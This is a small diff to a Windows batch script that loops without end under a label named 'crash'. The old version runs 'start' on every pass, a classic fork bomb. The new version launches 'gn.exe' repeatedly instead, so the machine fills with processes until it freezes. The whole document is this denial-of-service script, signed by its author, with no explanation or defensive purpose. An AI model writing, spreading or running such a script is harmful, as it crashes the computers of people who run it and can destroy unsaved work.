@@ -1,6 +1,6 @@
-rem Made by ThatZiv 
+rem @ThatZiv 
 @echo off
 :crash
-  start
+  start gn.exe
   echo bye bye
 goto crash
